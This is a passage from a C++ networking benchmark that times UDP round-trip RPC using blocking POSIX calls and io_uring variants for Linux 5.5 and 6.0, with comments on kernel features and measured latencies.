            std::size_t reply_length =
                packet_modify(receive_buffer.data(), static_cast<std::size_t>(received_length), send_buffer.data());
            sendto(socket_descriptor_, send_buffer.data(), reply_length, 0,
                   reinterpret_cast<sockaddr *>(&client_address), client_len);
        }
    }
};

/**
 *  @brief  A minimal RPC @b client using LibC functionality to setup the UDP socket,
 *          and synchronous blocking POSIX calls to send and receive packets -
 *          @b one at a time!
 */
class rpc_libc_client {
    int socket_descriptor_;
    sockaddr_in server_address_;
    std::size_t concurrency_;

  public:
    rpc_libc_client(std::string const &server_address_str, std::uint16_t port, std::size_t concurrency)
        : concurrency_(concurrency) {

        auto [socket_descriptor, server_address] = rpc_client_socket(server_address_str, port);
        socket_descriptor_ = socket_descriptor;
        server_address_ = server_address;

        // Let's make sure we don't block forever on `recvfrom`
        struct timeval duration;
        duration.tv_sec = 0;
        duration.tv_usec = to_microseconds(rpc_batch_timeout_k).count();
        if (setsockopt(socket_descriptor_, SOL_SOCKET, SO_RCVTIMEO, &duration, sizeof(duration)) < 0)
            raise_system_error("Failed to set sockets batch timeout");
    }

    ~rpc_libc_client() noexcept { close(socket_descriptor_); }

    rpc_batch_result operator()() noexcept {
        rpc_batch_result result;

        sockaddr_in reply_addr;
        socklen_t reply_len = sizeof(reply_addr);
        rpc_buffer_t send_buffer, receive_buffer;
        send_buffer.fill('X');

        for (std::size_t i = 0; i < concurrency_; ++i) {
            auto send_time = std::chrono::steady_clock::now();
            ssize_t sent_length = sendto(socket_descriptor_, send_buffer.data(), send_buffer.size(), 0,
                                         reinterpret_cast<sockaddr *>(&server_address_), sizeof(server_address_));
            result.sent_packets++;
            if (sent_length <= 0) continue;

            // In general, `select` is used to monitor multiple file descriptors or sockets at once
            // to see if they are ready for I/O, but in this case we use it to constrain the time
            // we are willing to wait for a single response.
            struct timeval expiry;
            expiry.tv_sec = 0;
            expiry.tv_usec = to_microseconds(rpc_packet_timeout_k).count();
            fd_set available_descriptors;
            FD_ZERO(&available_descriptors);
            FD_SET(socket_descriptor_, &available_descriptors);
            if (select(socket_descriptor_ + 1, &available_descriptors, nullptr, nullptr, &expiry) <= 0) continue;

            ssize_t received_length = recvfrom(socket_descriptor_, receive_buffer.data(), receive_buffer.size(), 0,
                                               reinterpret_cast<sockaddr *>(&reply_addr), &reply_len);
            if (received_length <= 0) continue;
            auto response_time = std::chrono::steady_clock::now();
            auto diff = response_time - send_time;
            result.batch_latency += diff;
            result.max_packet_latency = std::max(result.max_packet_latency, diff);
            result.received_packets++;
        }
        return result;
    }
};

/**
 *  Here we can show-off one more Google Benchmark feature - overriding the
 *  default timer! Measuring the time on the computer is an expensive operation,
 *  and assuming we've already done that in the client itself, we can use the
 *  @b `UseManualTime` feature to avoid the overhead of measuring time in the server.
 */
template <typename server_t, typename client_t>
static void rpc(bm::State &state, networking_route_t route, std::size_t batch_size, std::size_t packet_size) {

    std::string address_to_listen = route == networking_route_t::loopback_k ? "127.0.0.1" : "0.0.0.0";
    std::string address_to_talk = route == networking_route_t::loopback_k ? "127.0.0.1" : fetch_public_ip();

    rpc_batch_result stats;
    try {
        // Create server and client
        server_t server(address_to_listen, rpc_port_k, batch_size);
        client_t client(address_to_talk, rpc_port_k, batch_size);

        std::thread server_thread(std::ref(server));
        std::this_thread::sleep_for(std::chrono::milliseconds(100));

        // Benchmark round-trip time
        for (auto _ : state) {
            rpc_batch_result batch_stats = client();
            stats += batch_stats;
            double seconds =
                std::chrono::duration_cast<std::chrono::duration<double>>(batch_stats.batch_latency).count();
            state.SetIterationTime(seconds);
        }

        server.stop();        // Inform the server to stop polling for new packets
        server_thread.join(); // Wait for the server to finish
        server.close();       // Close the server socket and free resources
    }
    catch (std::exception const &e) {
        state.SkipWithError(e.what());
    }

    // Process and report stats
    auto const mean_batch_latency_us =
        stats.received_packets ? to_microseconds(stats.batch_latency).count() * 1.0 / state.iterations() : 0.0;
    auto const mean_packet_latency_us = to_microseconds(stats.batch_latency).count() * 1.0 / stats.received_packets;

    state.SetItemsProcessed(stats.sent_packets);
    state.SetBytesProcessed(stats.sent_packets * packet_size);
    state.counters["drop,%"] = 100.0 * (stats.sent_packets - stats.received_packets) / stats.sent_packets;
    state.counters["mean_batch_latency,us"] = mean_batch_latency_us;
    state.counters["mean_packet_latency,us"] = mean_packet_latency_us;
    state.counters["max_packet_latency,us"] = to_microseconds(stats.max_packet_latency).count();
}

static void rpc_libc(bm::State &state, networking_route_t route, std::size_t batch_size, std::size_t packet_size) {
    return rpc<rpc_libc_server, rpc_libc_client>(state, route, batch_size, packet_size);
}

BENCHMARK_CAPTURE(rpc_libc, loopback, networking_route_t::loopback_k, //
                  256 /* messages per batch */, 1024 /* bytes per packet */)
    ->MinTime(2)
    ->UseManualTime()                // We are logging time with `SetIterationTime`
    ->Unit(benchmark::kMicrosecond); // For IO, higher resolution than microseconds is too verbose

BENCHMARK_CAPTURE(rpc_libc, public, networking_route_t::public_k, //
                  256 /* messages per batch */, 1024 /* bytes per packet */)
    ->MinTime(2)
    ->UseManualTime()                // We are logging time with `SetIterationTime`
    ->Unit(benchmark::kMicrosecond); // For IO, higher resolution than microseconds is too verbose

#pragma endregion // POSIX

#pragma region IO Uring for Linux Kernel 5.5
#if defined(__linux__)
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 5, 0)

/**
 *  We will start by designing a version that only uses features available
 *  on the Linux kernel 5.5 or earlier:
 *  - `IORING_OP_RECVMSG` and `IORING_OP_SENDMSG` - since 5.3
 *  - `IORING_OP_LINK_TIMEOUT` - since 5.5
 *  - `IORING_OP_TIMEOUT` - since 5.4
 *  - `IORING_REGISTER_BUFFERS` - since 5.1
 *
 *  @see Supported operations: https://man7.org/linux/man-pages/man2/io_uring_enter2.2.html
 *  @see Kernel versions in Ubuntu: https://ubuntu.com/security/livepatch/docs/livepatch/reference/kernels
 */
#include <liburing.h>    // `io_uring`
#include <sys/utsname.h> // `uname`
#include <sys/mman.h>    // `mmap`, `munmap`

std::pair<int, int> fetch_linux_kernel_version() {
    struct utsname buffer;
    if (uname(&buffer) < 0) throw std::runtime_error("Failed to fetch Linux kernel version");
    int major = 0, minor = 0;
    // Attempt to parse something like "5.19.0-38-generic" into major=5, minor=19
    std::sscanf(buffer.release, "%d.%d", &major, &minor);
    return {major, minor};
}

/**
 *  @brief  Memory allocator, sharing the same memory region between the kernel and user-space.
 *  @note   This is essential for `IORING_REGISTER_BUFFERS`.
 */
template <typename type_>
class mmap_array {
    type_ *data_ = nullptr;
    std::size_t size_ = 0;

  public:
    mmap_array(std::size_t count) : size_(count) {
        // The basic mmap call, creating an anonymous region:
        void *addr = ::mmap(            //
            nullptr,                    // no specific address
            size_ * sizeof(type_),      // length in bytes
            PROT_READ | PROT_WRITE,     // read/write allowed
            MAP_SHARED | MAP_ANONYMOUS, // not backed by a file
            -1,                         // no file descriptor
            0                           // offset
        );
        if (addr == MAP_FAILED) throw std::bad_alloc();

        // Ensure the pages are locked in memory:
        if (mlock(addr, size_ * sizeof(type_)) != 0) {
            ::munmap(addr, size_ * sizeof(type_));
            throw std::runtime_error("`mlock` failed");
        }

        data_ = static_cast<type_ *>(addr);
    }

    ~mmap_array() noexcept {
        ::munlock(data_, size_ * sizeof(type_));
        ::munmap(data_, size_ * sizeof(type_));
    }

    type_ *begin() const noexcept { return data_; }
    type_ *end() const noexcept { return data_ + size_; }
    type_ &operator[](std::size_t idx) noexcept { return data_[idx]; }
    type_ operator[](std::size_t idx) const noexcept { return data_[idx]; }
    std::size_t size() const noexcept { return size_; }
};

/**
 *  @brief  Wraps the `rpc_buffer_t` with metadata about the client address.
 *
 *  It's a common pattern in async systems to store request metadata next
 *  to the buffer to locate both with a single pointer.
 */
struct alignas(64) message_t {
    enum class message_status_t {
        pending_k,
        sending_k,
        receiving_k,
    };
    rpc_buffer_t buffer;                             //? Put first to improve alignment
    struct iovec io_vec;                             //? Point to `buffer` 🙃
    struct msghdr header;                            //? Point to the `io_vec` 🙃🙃
    sockaddr_in peer_address;                        //? Where is the packet coming from?
    message_status_t status;                         //? For our simple state machine
    std::chrono::steady_clock::time_point timestamp; //? Optional
};

/**
 *  @brief  A minimal RPC @b server using @b `io_uring` functionality
 *          to setup the UDP socket, and process many requests concurrently.
 */
class rpc_uring55_server {

    int socket_descriptor_;
    sockaddr_in server_address_;
    std::atomic_bool should_stop_;
    io_uring ring_;

    // Pre-allocated resources
    mmap_array<message_t> messages_;
    std::size_t max_concurrency_;

  public:
    using status_t = message_t::message_status_t;

    rpc_uring55_server(std::string const &server_address_str, std::uint16_t port, std::size_t max_concurrency)
        : should_stop_(false), messages_(max_concurrency * 2), max_concurrency_(max_concurrency) {

        auto [socket_descriptor, server_address] = rpc_server_socket(port, server_address_str);
        socket_descriptor_ = socket_descriptor;
        server_address_ = server_address;

        // Initialize `io_uring` with one slot for each receive/send operation
        if (io_uring_queue_init(max_concurrency * 2, &ring_, 0) < 0)
            raise_system_error("Failed to initialize io_uring 5.5 server");
        if (io_uring_register_files(&ring_, &socket_descriptor_, 1) < 0)
            raise_system_error("Failed to register file descriptor with io_uring 5.5 server");

        // Initialize message resources
        for (message_t &message : messages_) {
            memset(&message.header, 0, sizeof(message.header));
            message.header.msg_name = &message.peer_address;
            message.header.msg_namelen = sizeof(sockaddr_in);
            // Each message will be made of just one buffer
            message.header.msg_iov = &message.io_vec;
            message.header.msg_iovlen = 1;
            // ... and that buffer is a member of our `message`
            message.io_vec.iov_base = message.buffer.data();
            message.io_vec.iov_len = message.buffer.size();
            message.status = status_t::pending_k;
        }

        // Let's register all of those with `IORING_REGISTER_BUFFERS`
        std::vector<struct iovec> iovecs_to_register;
        for (message_t &message : messages_) iovecs_to_register.push_back(message.io_vec);
        if (io_uring_register_buffers(&ring_, iovecs_to_register.data(), iovecs_to_register.size()) < 0)
            raise_system_error("Failed to register buffers with io_uring 5.5 server");
    }

    ~rpc_uring55_server() noexcept {}
    void close() noexcept {
        ::close(socket_descriptor_);
        io_uring_queue_exit(&ring_);
    }

    void stop() noexcept { should_stop_.store(true, std::memory_order_seq_cst); }

    void operator()() noexcept {
        // Submit initial receive operations
        for (message_t &message : messages_) {
            message.status = status_t::receiving_k;
            memset(&message.peer_address, 0, sizeof(sockaddr_in));
            struct io_uring_sqe *receive_entry = io_uring_get_sqe(&ring_);
            io_uring_prep_recvmsg(receive_entry, socket_descriptor_, &message.header, 0);
            io_uring_sqe_set_data(receive_entry, &message);
        }

        io_uring_submit(&ring_);

        while (!should_stop_.load(std::memory_order_seq_cst)) {
            struct io_uring_cqe *completed_entry;
            bool completed_something = io_uring_peek_cqe(&ring_, &completed_entry) == 0;
            if (!completed_something) continue;

            int transmitted_length = completed_entry->res;
            message_t &message = *static_cast<message_t *>(io_uring_cqe_get_data(completed_entry));

            // If we've received some content, submit a reply
            if (message.status == status_t::receiving_k) {
                struct io_uring_sqe *send_entry = io_uring_get_sqe(&ring_);
                message.status = status_t::sending_k;
                io_uring_prep_sendmsg(send_entry, socket_descriptor_, &message.header, 0);
                io_uring_sqe_set_data(send_entry, &message);
            }

            // Prepare next receive operation
            else if (message.status == status_t::sending_k) {
                struct io_uring_sqe *receive_entry = io_uring_get_sqe(&ring_);
                message.status = status_t::receiving_k;
                memset(&message.peer_address, 0, sizeof(sockaddr_in));
                io_uring_prep_recvmsg(receive_entry, socket_descriptor_, &message.header, 0);
                io_uring_sqe_set_data(receive_entry, &message);
            }

            io_uring_cqe_seen(&ring_, completed_entry);
            io_uring_submit(&ring_);
        }
    }
};

/**
 *  @brief  A minimal RPC @b client using @b `io_uring` functionality
 *          to setup the UDP socket, and process many requests in batches.
 */
class rpc_uring55_client {

    int socket_descriptor_;
    sockaddr_in server_address_;
    io_uring ring_;

    // Pre-allocated resources
    mmap_array<message_t> messages_;
    message_t packet_timeout_handle_;
    message_t batch_timeout_handle_;

  public:
    using status_t = message_t::message_status_t;

    rpc_uring55_client(std::string const &server_addr, std::uint16_t port, std::size_t concurrency)
        : messages_(concurrency) {
        // Initialize socket
        socket_descriptor_ = socket(AF_INET, SOCK_DGRAM, 0);
        if (socket_descriptor_ < 0) raise_system_error("Failed to create socket");

        // Resolve server address
        server_address_.sin_family = AF_INET;
        server_address_.sin_addr.s_addr = inet_addr(server_addr.c_str());
        server_address_.sin_port = htons(port);

        // Initialize io_uring with one slot for each send/receive/timeout operation,
        // as well as a batch-level timeout operation and a cancel operation for the
        // batch-level timeout.
        if (io_uring_queue_init(concurrency * 3 + 1 + 1, &ring_, 0) < 0)
            raise_system_error("Failed to initialize io_uring 5.5 client");
        if (io_uring_register_files(&ring_, &socket_descriptor_, 1) < 0)
            raise_system_error("Failed to register file descriptor with io_uring 5.5 client");

        // Initialize message resources
        for (message_t &message : messages_) {
            memset(&message.header, 0, sizeof(message.header));
            message.header.msg_name = &server_address_;
            message.header.msg_namelen = sizeof(server_address_);
            // Each message will be made of just one buffer
            message.header.msg_iov = &message.io_vec;
            message.header.msg_iovlen = 1;
            // ... and that buffer is a member of our `message`
            message.io_vec.iov_base = message.buffer.data();
            message.io_vec.iov_len = message.buffer.size();
            // Initialize the buffer with some data
            message.buffer.fill('X');
            message.status = status_t::pending_k;
        }

        // Let's register all of those with `IORING_REGISTER_BUFFERS`
        std::vector<struct iovec> iovecs_to_register;
        for (message_t &message : messages_) iovecs_to_register.push_back(message.io_vec);
        if (io_uring_register_buffers(&ring_, iovecs_to_register.data(), iovecs_to_register.size()) < 0)
            raise_system_error("Failed to register buffers with io_uring 5.5 client");
    }

    ~rpc_uring55_client() noexcept {
        close(socket_descriptor_);
        io_uring_queue_exit(&ring_);
    }

    rpc_batch_result operator()() noexcept {
        rpc_batch_result result;

        auto const batch_start_time = std::chrono::steady_clock::now();
        auto const billion = 1'000'000'000;
        // For a batch-wide timeout, we could use:
        //
        //      struct __kernel_timespec batch_timeout;
        //      auto const batch_ns = std::chrono::duration_cast<std::chrono::nanoseconds>(rpc_batch_timeout_k);
        //      batch_timeout.tv_sec = static_cast<__s64>(batch_ns.count() / billion);
        //      batch_timeout.tv_nsec = static_cast<__s64>(batch_ns.count() % billion);
        struct __kernel_timespec packet_timeout;
        {
            auto const packet_ns = std::chrono::duration_cast<std::chrono::nanoseconds>(rpc_packet_timeout_k);
            packet_timeout.tv_sec = static_cast<__s64>(packet_ns.count() / billion);
            packet_timeout.tv_nsec = static_cast<__s64>(packet_ns.count() % billion);
        }

        // Submit tasks
        int count_entries = 0;
        for (auto &message : messages_) {

            // Prepare send operation
            auto *submitted_entry = io_uring_get_sqe(&ring_);
            io_uring_prep_sendmsg(submitted_entry, socket_descriptor_, &message.header, 0);
            io_uring_sqe_set_data(submitted_entry, &message);
            //? We could also use `IOSQE_CQE_SKIP_SUCCESS` here.
            //? In that case the State Machine below would be simpler,
            //? but it would be less representative of a real-world scenario.
            io_uring_sqe_set_flags(submitted_entry, IOSQE_IO_LINK); // Don't receive before sending :)
            message.timestamp = std::chrono::steady_clock::now();
            message.status = status_t::sending_k;
            count_entries++;

            // Prepare receive operation
            submitted_entry = io_uring_get_sqe(&ring_);
            io_uring_prep_recvmsg(submitted_entry, socket_descriptor_, &message.header, 0);
            io_uring_sqe_set_data(submitted_entry, &message);       // Attach to the same buffer
            io_uring_sqe_set_flags(submitted_entry, IOSQE_IO_LINK); // Link to timeout!
            count_entries++;

            // Timeout operation
            submitted_entry = io_uring_get_sqe(&ring_);
            io_uring_prep_link_timeout(submitted_entry, &packet_timeout, 0);
            io_uring_sqe_set_data(submitted_entry, &packet_timeout_handle_);
            count_entries++;

            result.sent_packets++;
        }
        // We can add a batch-wide timeout:
        //
        //      auto *batch_timeout_entry = io_uring_get_sqe(&ring_);
        //      io_uring_prep_timeout(batch_timeout_entry, &batch_timeout, count_entries, 0);
        //      io_uring_sqe_set_data(batch_timeout_entry, &batch_timeout_handle_);
        //      count_entries++;
        int submitted_entries = io_uring_submit_and_wait(&ring_, count_entries);
        if (submitted_entries != count_entries) raise_system_error("Failed to submit io_uring");

        // Wait until all packets are received or the batch times out
        bool batch_killed = false;
        std::size_t failed_packets = 0;
        while (result.received_packets + failed_packets < result.sent_packets && !batch_killed) {
            struct io_uring_cqe *completed_entry;
            int completed_code = io_uring_wait_cqe(&ring_, &completed_entry);
            message_t &message = *static_cast<message_t *>(io_uring_cqe_get_data(completed_entry));
            io_uring_cqe_seen(&ring_, completed_entry);

            if (&message == &packet_timeout_handle_) { continue; }                // We don't care about timeouts
            else if (&message == &batch_timeout_handle_) { batch_killed = true; } // Time to exit!
            else if (completed_code < 0) { failed_packets++; }                    // Failed operation
            else {
                // Successful submitted the send request:
                if (message.status == status_t::sending_k) { message.status = status_t::receiving_k; }
                // Received a reply:
                else {
                    auto now = std::chrono::steady_clock::now();
                    auto diff = now - message.timestamp;
                    result.max_packet_latency = std::max(result.max_packet_latency, diff);
                    result.received_packets++;
                }
            }
        }

        // In case we haven't reached the deadline, cancel the batch timeout.
        // It should drain the queues before we call this function again:
        //
        //      if (!batch_killed) {
        //          auto *lift_timeout_entry = io_uring_get_sqe(&ring_);
        //          auto batch_timeout_user_data = reinterpret_cast<std::uint64_t>(&batch_timeout_handle_);
        //          io_uring_prep_timeout_remove(lift_timeout_entry, batch_timeout_user_data, 0);
        //          io_uring_submit_and_wait(&ring_, 1);
        //      }

        result.batch_latency = std::chrono::steady_clock::now() - batch_start_time;
        return result;
    }
};

static void rpc_uring55(bm::State &state, networking_route_t route, std::size_t batch_size, std::size_t packet_size) {
    auto [major, minor] = fetch_linux_kernel_version();
    if (major < 5 || (major == 5 && minor < 5)) {
        std::string message = "Kernel version "s + std::to_string(major) + "."s + std::to_string(minor) +
                              " too old for io_uring 5.5 variant"s;
        state.SkipWithError(message.c_str());
        return;
    }
    return rpc<rpc_uring55_server, rpc_uring55_client>(state, route, batch_size, packet_size);
}

BENCHMARK_CAPTURE(rpc_uring55, loopback, networking_route_t::loopback_k, 256 /* messages per batch */,
                  1024 /* bytes per packet */)
    ->MinTime(2)
    ->UseManualTime()
    ->Unit(benchmark::kMicrosecond);

BENCHMARK_CAPTURE(rpc_uring55, public, networking_route_t::public_k, 256 /* messages per batch */,
                  1024 /* bytes per packet */)
    ->MinTime(2)
    ->UseManualTime()
    ->Unit(benchmark::kMicrosecond);

#endif            // Is Linux 5.5 or higher
#endif            // Is Linux
#pragma endregion // IO Uring for Linux Kernel 5.5

/**
 *  This already provides noticeable improvements over the POSIX version:
 *
 *  - Blocking POSIX calls take @b 20-30 microseconds for ping-pong on loopback.
 *  - Non-blocking `io_uring` calls take @b 5-10 microseconds on the same path.
 *
 *  But our previous version is still quite basic, and doesn't use:
 *
 *  - `IORING_RECV_MULTISHOT` or `io_uring_prep_recvmsg_multishot` - since 6.0
 *  - `IORING_OP_SEND_ZC` or `io_uring_prep_sendmsg_zc` - since 6.0
 *  - `IORING_SETUP_SQPOLL` - with `IORING_FEAT_SQPOLL_NONFIXED` after 5.11
 *  - `IORING_SETUP_SUBMIT_ALL` - since 5.18
 *  - `IORING_SETUP_COOP_TASKRUN` - since 5.19
 *  - `IORING_SETUP_SINGLE_ISSUER` - since 6.0
 *
 *  Let's add all of those!
 *
 *  - `IORING_SETUP_COOP_TASKRUN` doesn't work
 *  - `IORING_SETUP_SINGLE_ISSUER` doesn't help
 *  - `IORING_SETUP_SUBMIT_ALL` - core dumped :O
 *  - `IORING_OP_SEND_ZC` - core dumped :O
 */

#pragma region IO Uring for Linux Kernel 6.0
#if defined(__linux__)
#include <linux/version.h>
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 0, 0)

/**
 *  @brief  A minimal RPC @b server using @b `io_uring` functionality
 *          to setup the UDP socket, and process many requests concurrently.
 *
 *  Unlike the `rpc_uring55_server`, this version:
 *  - registers buffers and off-loads buffer selection to the kernel
 *  - reduces the number of receive operations, using multi-shot receive
 */
class rpc_uring60_server {

    int socket_descriptor_;
    sockaddr_in server_address_;
    std::atomic_bool should_stop_;
    io_uring ring_;

    // Pre-allocated resources
    mmap_array<message_t> messages_;
    std::size_t max_concurrency_;

  public:
    using status_t = message_t::message_status_t;

    rpc_uring60_server(std::string const &server_address_str, std::uint16_t port, std::size_t max_concurrency)
        : should_stop_(false), messages_(max_concurrency * 2), max_concurrency_(max_concurrency) {

        auto [socket_descriptor, server_address] = rpc_server_socket(port, server_address_str);
        socket_descriptor_ = socket_descriptor;
        server_address_ = server_address;

        // Zero copy operations would require more socket options
        int const one = 1;
        if (setsockopt(socket_descriptor_, SOL_SOCKET, SO_ZEROCOPY, &one, sizeof(one)) < 0)
            raise_system_error("Failed to enable zero-copy on socket");

        // Initialize `io_uring` with one slot for each receive/send operation
        // TODO: |= IORING_SETUP_COOP_TASKRUN | IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_SUBMIT_ALL
        auto io_uring_setup_flags = 0;
        if (io_uring_queue_init(max_concurrency * 2, &ring_, io_uring_setup_flags) < 0)
            raise_system_error("Failed to initialize io_uring 6.0 server");
        if (io_uring_register_files(&ring_, &socket_descriptor_, 1) < 0)
            raise_system_error("Failed to register file descriptor with io_uring 6.0 server");

        // Initialize message resources
        for (message_t &message : messages_) {
            memset(&message.header, 0, sizeof(message.header));
            message.header.msg_name = &message.peer_address;
            message.header.msg_namelen = sizeof(sockaddr_in);
            // Each message will be made of just one buffer
            message.header.msg_iov = &message.io_vec;
            message.header.msg_iovlen = 1;
            // ... and that buffer is a member of our `message`
            message.io_vec.iov_base = message.buffer.data();
            message.io_vec.iov_len = message.buffer.size();
            message.status = status_t::pending_k;
        }

        // Let's register all of those with `IORING_REGISTER_BUFFERS`
        std::vector<struct iovec> iovecs_to_register;
        for (message_t &message : messages_) iovecs_to_register.push_back(message.io_vec);
        if (io_uring_register_buffers(&ring_, iovecs_to_register.data(), iovecs_to_register.size()) < 0)
            raise_system_error("Failed to register buffers with io_uring 6.0 server");
    }

    ~rpc_uring60_server() noexcept {}
    void close() noexcept {
        ::close(socket_descriptor_);
        io_uring_queue_exit(&ring_);
    }

    void stop() noexcept { should_stop_.store(true, std::memory_order_seq_cst); }

    void operator()() noexcept {
        // Submit the initial receive operation
        {
            message_t &message = *messages_.begin();
            struct io_uring_sqe *receive_entry = io_uring_get_sqe(&ring_);
            io_uring_prep_recvmsg_multishot(receive_entry, socket_descriptor_, &message.header, MSG_TRUNC);
            receive_entry->flags |= IOSQE_FIXED_FILE;
            receive_entry->flags |= IOSQE_BUFFER_SELECT;
            receive_entry->buf_group = 0;
            io_uring_sqe_set_data(receive_entry, &message);
        }
        io_uring_submit(&ring_);

        while (!should_stop_.load(std::memory_order_seq_cst)) {
            struct io_uring_cqe *completed_entry;
            bool completed_something = io_uring_peek_cqe(&ring_, &completed_entry) == 0;
            if (!completed_something) continue;

            int transmitted_length = completed_entry->res;
            message_t &message = *static_cast<message_t *>(io_uring_cqe_get_data(completed_entry));

            // If we've received some content, submit a reply
            if (message.status == status_t::receiving_k) {
                struct io_uring_sqe *send_entry = io_uring_get_sqe(&ring_);
                message.status = status_t::sending_k;
                io_uring_prep_sendmsg_zc(send_entry, socket_descriptor_, &message.header, 0);
                send_entry->flags |= IOSQE_FIXED_FILE;
                io_uring_sqe_set_data(send_entry, &message);
            }

            // Prepare next receive operation
            else if (message.status == status_t::sending_k) {
                struct io_uring_sqe *receive_entry = io_uring_get_sqe(&ring_);
                message.status = status_t::receiving_k;
                memset(&message.peer_address, 0, sizeof(sockaddr_in));
                io_uring_prep_recvmsg(receive_entry, socket_descriptor_, &message.header, 0);
                receive_entry->flags |= IOSQE_FIXED_FILE;
                io_uring_sqe_set_data(receive_entry, &message);
            }

            io_uring_cqe_seen(&ring_, completed_entry);
            io_uring_submit(&ring_);
        }
    }
};

/**
 *  @brief  A minimal RPC @b client using @b `io_uring` functionality
 *          to setup the UDP socket, and process many requests in batches.
 */
class rpc_uring60_client {

    int socket_descriptor_;
    sockaddr_in server_address_;
    io_uring ring_;

    // Pre-allocated resources
    mmap_array<message_t> messages_;
    message_t packet_timeout_handle_;
    message_t batch_timeout_handle_;

  public:
    using status_t = message_t::message_status_t;

    rpc_uring60_client(std::string const &server_addr, std::uint16_t port, std::size_t concurrency)
        : messages_(concurrency) {
        // Initialize socket
        socket_descriptor_ = socket(AF_INET, SOCK_DGRAM, 0);
        if (socket_descriptor_ < 0) raise_system_error("Failed to create socket");

        // Zero copy operations would require more socket options
        int const one = 1;
        if (setsockopt(socket_descriptor_, SOL_SOCKET, SO_ZEROCOPY, &one, sizeof(one)) < 0)
            raise_system_error("Failed to enable zero-copy on socket");

        // Resolve server address
        server_address_.sin_family = AF_INET;
        server_address_.sin_addr.s_addr = inet_addr(server_addr.c_str());
        server_address_.sin_port = htons(port);

        // Initialize io_uring with one slot for each send/receive/timeout operation,
        // as well as a batch-level timeout operation and a cancel operation for the
        // batch-level timeout.
        auto io_uring_setup_flags = 0;
        if (io_uring_queue_init(concurrency * 3 + 1 + 1, &ring_, io_uring_setup_flags) < 0)
            raise_system_error("Failed to initialize io_uring 6.0 client");
        if (io_uring_register_files(&ring_, &socket_descriptor_, 1) < 0)
            raise_system_error("Failed to register file descriptor with io_uring 6.0 client");

        // Initialize message resources
        for (message_t &message : messages_) {
            memset(&message.header, 0, sizeof(message.header));
            message.header.msg_name = &server_address_;
            message.header.msg_namelen = sizeof(server_address_);
            // Each message will be made of just one buffer
            message.header.msg_iov = &message.io_vec;
            message.header.msg_iovlen = 1;
            // ... and that buffer is a member of our `message`
            message.io_vec.iov_base = message.buffer.data();
            message.io_vec.iov_len = message.buffer.size();
            // Initialize the buffer with some data
            message.buffer.fill('X');
            message.status = status_t::pending_k;
        }

        // Let's register all of those with `IORING_REGISTER_BUFFERS`
        std::vector<struct iovec> iovecs_to_register;
        for (message_t &message : messages_) iovecs_to_register.push_back(message.io_vec);
        if (io_uring_register_buffers(&ring_, iovecs_to_register.data(), iovecs_to_register.size()) < 0)
            raise_system_error("Failed to register buffers with io_uring 6.0 client");
    }

    ~rpc_uring60_client() noexcept {
        close(socket_descriptor_);
        io_uring_queue_exit(&ring_);
    }

    rpc_batch_result operator()() noexcept {
        rpc_batch_result result;

        auto const batch_start_time = std::chrono::steady_clock::now();
        auto const billion = 1'000'000'000;
        // For a batch-wide timeout, we could use:
        //
        //      struct __kernel_timespec batch_timeout;
        //      auto const batch_ns = std::chrono::duration_cast<std::chrono::nanoseconds>(rpc_batch_timeout_k);
        //      batch_timeout.tv_sec = static_cast<__s64>(batch_ns.count() / billion);
        //      batch_timeout.tv_nsec = static_cast<__s64>(batch_ns.count() % billion);
        struct __kernel_timespec packet_timeout;
        {
            auto const packet_ns = std::chrono::duration_cast<std::chrono::nanoseconds>(rpc_packet_timeout_k);
            packet_timeout.tv_sec = static_cast<__s64>(packet_ns.count() / billion);
            packet_timeout.tv_nsec = static_cast<__s64>(packet_ns.count() % billion);
        }

        // Submit tasks
        int count_entries = 0;
        for (auto &message : messages_) {

            // Prepare send operation
            auto *submitted_entry = io_uring_get_sqe(&ring_);
            io_uring_prep_sendmsg(submitted_entry, socket_descriptor_, &message.header, MSG_WAITALL);
            io_uring_sqe_set_data(submitted_entry, &message);
            //? We could also use `IOSQE_CQE_SKIP_SUCCESS` here.
            //? In that case the State Machine below would be simpler,
            //? but it would be less representative of a real-world scenario.
            io_uring_sqe_set_flags(submitted_entry, IOSQE_IO_LINK); // Don't receive before sending :)
            message.timestamp = std::chrono::steady_clock::now();
            message.status = status_t::sending_k;
            count_entries++;

            // Prepare receive operation
            submitted_entry = io_uring_get_sqe(&ring_);
            io_uring_prep_recvmsg(submitted_entry, socket_descriptor_, &message.header, 0);
            io_uring_sqe_set_data(submitted_entry, &message);       // Attach to the same buffer
            io_uring_sqe_set_flags(submitted_entry, IOSQE_IO_LINK); // Link to timeout!
            count_entries++;

            // Timeout operation
            submitted_entry = io_uring_get_sqe(&ring_);
            io_uring_prep_link_timeout(submitted_entry, &packet_timeout, 0);
            io_uring_sqe_set_data(submitted_entry, &packet_timeout_handle_);
            count_entries++;

            result.sent_packets++;
        }
        // We can add a batch-wide timeout:
        //
        //      auto *batch_timeout_entry = io_uring_get_sqe(&ring_);
        //      io_uring_prep_timeout(batch_timeout_entry, &batch_timeout, count_entries, 0);
        //      io_uring_sqe_set_data(batch_timeout_entry, &batch_timeout_handle_);
        //      count_entries++;
        int submitted_entries = io_uring_submit_and_wait(&ring_, count_entries);
        if (submitted_entries != count_entries) raise_system_error("Failed to submit io_uring");

        // Wait until all packets are received or the batch times out
        bool batch_killed = false;
        std::size_t failed_packets = 0;
        while (result.received_packets + failed_packets < result.sent_packets && !batch_killed) {
            struct io_uring_cqe *completed_entry;
            int completed_code = io_uring_wait_cqe(&ring_, &completed_entry);
            message_t &message = *static_cast<message_t *>(io_uring_cqe_get_data(completed_entry));
            io_uring_cqe_seen(&ring_, completed_entry);

            if (&message == &packet_timeout_handle_) { continue; }                // We don't care about timeouts
            else if (&message == &batch_timeout_handle_) { batch_killed = true; } // Time to exit!
            else if (completed_code < 0) { failed_packets++; }                    // Failed operation
            else {
                // Successful submitted the send request:
                if (message.status == status_t::sending_k) { message.status = status_t::receiving_k; }
                // Received a reply:
                else {
                    auto now = std::chrono::steady_clock::now();
                    auto diff = now - message.timestamp;
                    result.max_packet_latency = std::max(result.max_packet_latency, diff);
                    result.received_packets++;
                }
            }
        }

        // In case we haven't reached the deadline, cancel the batch timeout.
        // It should drain the queues before we call this function again:
        //
        //      if (!batch_killed) {
        //          auto *lift_timeout_entry = io_uring_get_sqe(&ring_);
        //          auto batch_timeout_user_data = reinterpret_cast<std::uint64_t>(&batch_timeout_handle_);
        //          io_uring_prep_timeout_remove(lift_timeout_entry, batch_timeout_user_data, 0);
